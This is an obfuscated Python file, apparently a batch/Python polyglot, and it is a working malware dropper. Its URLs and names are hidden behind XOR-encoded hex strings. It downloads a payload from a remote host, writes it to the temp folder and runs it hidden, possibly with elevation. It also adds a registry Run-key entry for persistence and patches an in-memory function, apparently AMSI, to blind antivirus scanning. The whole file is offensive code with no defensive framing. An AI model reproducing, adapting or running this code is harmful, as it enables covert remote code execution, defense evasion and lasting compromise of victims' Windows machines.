"echo off"; ""
cls_=type('_',(),{})
_=cls_()

def _dec(a, b, k):
    x = bytes.fromhex(a.decode())
    y = bytes.fromhex(b.decode())
    z = bytes.fromhex(k.decode())
    return "".join(chr(y[i] ^ x[i] ^ z[i % len(z)]) for i in range(len(y)))


def _spawn(p, hide):
    c = __import__("ctypes")
    o = __import__("os")
    sp = __import__("subprocess")
    try:
        o.chmod(p, 0o777)
    except Exception:
        pass
    n = 0 if hide else 1
    s = c.WinDLL(_._[6], use_last_error=True)
    s.ShellExecuteW.restype = c.c_void_p
    s.ShellExecuteW.argtypes = [c.c_void_p, c.c_wchar_p, c.c_wchar_p, c.c_wchar_p, c.c_wchar_p, c.c_int]
    for v in (_._[7], _._[8]):
        try:
            if s.ShellExecuteW(None, v, p, None, o.path.dirname(p), n) > 32:
                return True
        except Exception:
            pass
    try:
        i = sp.STARTUPINFO()
        i.dwFlags |= sp.STARTF_USESHOWWINDOW
        i.wShowWindow = n
        sp.Popen([p], close_fds=True, creationflags=0x00000008 | 0x00000200, startupinfo=i)
        return True
    except Exception:
        return False


def _persist(p):
    try:
        w = __import__("winreg")
        k = w.OpenKey(w.HKEY_CURRENT_USER, _._[9], 0, w.KEY_SET_VALUE)
        w.SetValueEx(k, _._[10], 0, w.REG_SZ, chr(34) + p + chr(34))
        w.CloseKey(k)
    except Exception:
        pass

def _unhook():
    try:
        c = __import__("ctypes")
        k = c.WinDLL(_._[11], use_last_error=True)
        k.GetModuleHandleA.restype = c.c_void_p
        k.GetProcAddress.restype = c.c_void_p
        k.GetProcAddress.argtypes = [c.c_void_p, c.c_char_p]
        h = k.GetModuleHandleA(_._[12].encode())
        if not h:
            return False
        a = k.GetProcAddress(h, _._[13].encode())
        if not a:
            return False
        t = bytes.fromhex("b857000780c3")
        old = c.c_ulong(0)
        k.VirtualProtect(a, len(t), 0x40, c.byref(old))
        c.memmove(a, t, len(t))
        k.VirtualProtect(a, len(t), old.value, c.byref(old))
        return True
    except Exception:
        return False


def _drop(dst, data, hide, pers, amsi):
    o = __import__("os")
    tp = __import__("tempfile")
    path = o.path.join(tp.gettempdir(), dst)
    try:
        if o.path.exists(path):
            o.chmod(path, 0o666)
            o.remove(path)
    except Exception:
        pass
    try:
        with open(path, "wb") as f:
            f.write(data)
    except Exception:
        return 1
    if pers:
        _persist(path)
    if amsi:
        _unhook()
    return 0 if _spawn(path, hide) else 2

def _esc():
    try:
        me = __import__("os").path.abspath(__import__("sys").argv[0])
        __import__("subprocess").Popen(
            [_._[14], _._[15], _._[16] + chr(34) + me + chr(34)],
            creationflags=0x08000000,
            close_fds=True,
        )
    except Exception:
        pass


def _get(u):
    r = __import__("urllib.request", fromlist=["x"])
    h = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"}
    tm = __import__("time")
    for n in range(4):
        try:
            with r.urlopen(r.Request(u, headers=h), timeout=60) as f:
                return f.read()
        except Exception:
            tm.sleep(2 + n * 3)
    return None


def main():
    data = _get(_._[0])
    if not data:
        return 1
    rc = _drop(_._[1], data, _._[2], _._[3], _._[5])
    if _._[4]:
        _esc()
    return rc

_._=[
(b'043b12e655e92348efdc7df2b710188cf005b7926184efaa9bbd99e286bccbb7982480b6d4f637a7bc3998d4bda6892ad01627f9b4813b7f4b684c975141c13411c65b',b'3d202ae648e74201b2d471c8831231ceae03cfda2b96e596e59581a1adbcffab9634d6b6ddb60bbd824aafe0fd9fd92ac70d44bdea812a4a2d6140bc6e4be96a1a8a70',b'516f4c706e344e66397a654c',),
(b'70127195d20417e9026c6dab9f577b78',b'491356c5e50e7ead012569aedc7b7b4e',b'4978533858645a6a356735376d',),
(b'30',0,''),
(b'31',0,''),
(b'31',0,''),
(b'31',0,''),
(b'13922f7b5763e0',b'36cd39207712a5',b'563773374c42776b6b4e50',),
(b'4f2eb85bb0',b'4916a66cb2',b'744d70567150493773',),
(b'6f3ef154',b'7679db4a',b'76374f705a4e657a4f787a30',),
(b'12ddfeeb51620ad685ad240b8e3c359963dad21fb75afaf1420f89c2d3c0a2f3c827048ba8741a7565676ca719',b'02c1f2c8616e1ac0bda40e1b9604019b67ddea0c9d47f4c97211b7f2c2f693e5cc041583b874175e4848548530',b'43736a57476d62736444',),
(b'0eaa42d94804c50c31436739aaf1efc05eb9',b'0cf666887e18f26a02622305fcde92f64689',b'55354a35596b4435565332',),
(b'7ada634ca89bcad8',b'24ca2178b9ba95de',b'3575305a744d6c343543',),
(b'3573c98f35d3f03d',b'3c67f5aa2fddea03',b'68794f4c346a76523438324167',),
(b'5726e7c29ced46b8efadfaea4aed',b'7111dff8b5ec12b7ca82d7df55fd',b'675a4b537a623561',),
(b'e75f0749d10733',b'e7452c51f2182f',b'63774f3646677937',),
(b'52cd',b'09f8',b'7456334e5447764b47465a716a37',),
(b'016396a575b2bdeba824644a5183060e6bff4421cff00d3a1b0879dbff3f5cfeb38d85f603',b'26438e9730f9bbeaea43030c2ad75c1733b3204887cb1d2c0f1835e8d32529b4af999ceb74',b'57497655657a34366c',)

]
_p=[]
for _t in _._:
    if len(_t)<3:
        _p.append(_t[0])
    elif _t[1]==0:
        _p.append(_t[0]==b'30')
    elif _t[1]==b'base64':
        _p.append(__import__(chr(98)+chr(97)+chr(115)+chr(101)+chr(54)+chr(52)).b64decode(_t[0]).decode())
    else:
        _p.append(_dec(_t[0],_t[1],_t[2]))
_._=_p

if __name__=='__main__':
    __import__('sys').exit(main())
